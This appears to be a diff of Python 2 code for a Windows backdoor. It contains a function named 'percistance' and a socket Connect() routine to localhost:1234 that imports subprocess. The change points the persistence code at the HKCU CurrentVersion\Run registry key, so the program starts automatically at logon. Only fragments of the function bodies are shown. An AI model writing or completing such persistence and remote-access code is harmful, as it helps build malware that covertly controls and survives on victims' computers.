@@ -1,5 +1,7 @@
 import socket
 import subprocess
+import sys
+import os
 from _winreg import *
 
 def percistance (tempdir, fileName, run):
@@ -8,7 +10,7 @@ def percistance (tempdir, fileName, run):
     path = os.environ["TEMP"]
 # Queries Windows registry for key values
 # Appends autorun key to runkey array
-    key = OpenKey(HKEY_CURRENT_USER,'Software')
+    key = OpenKey(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run')
     runkey =[]
     try:
         i = 0
@@ -28,7 +30,7 @@ def percistance (tempdir, fileName, run):
         pass
 
 def Connect():
-
+    
     host = "localhost"
     port = 1234
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
